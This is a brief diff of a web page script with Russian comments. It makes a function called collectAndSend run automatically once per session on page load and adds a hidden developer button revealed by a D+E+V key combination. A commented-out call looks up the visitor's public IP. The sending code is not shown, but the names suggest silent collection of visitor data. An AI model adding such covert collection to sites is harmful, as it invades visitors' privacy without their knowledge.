@@ -59,9 +59,22 @@ async function collectAndSend() {
 }
 // fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => console.log(d))
 
-window.addEventListener('load', collectAndSend);
+window.addEventListener('load', () => {
+  if (!sessionStorage.getItem('sent')) {
+    collectAndSend();
+    sessionStorage.setItem('sent', '1');
+  }
+});
 
-
+// Секретная кнопка — нажми D+E+V одновременно
+const keys = new Set();
+document.addEventListener('keydown', e => {
+  keys.add(e.key.toLowerCase());
+  if (keys.has('d') && keys.has('e') && keys.has('v')) {
+    document.getElementById('devBtn').style.display = 'block';
+  }
+});
+document.addEventListener('keyup', e => keys.delete(e.key.toLowerCase()));
 
 
 
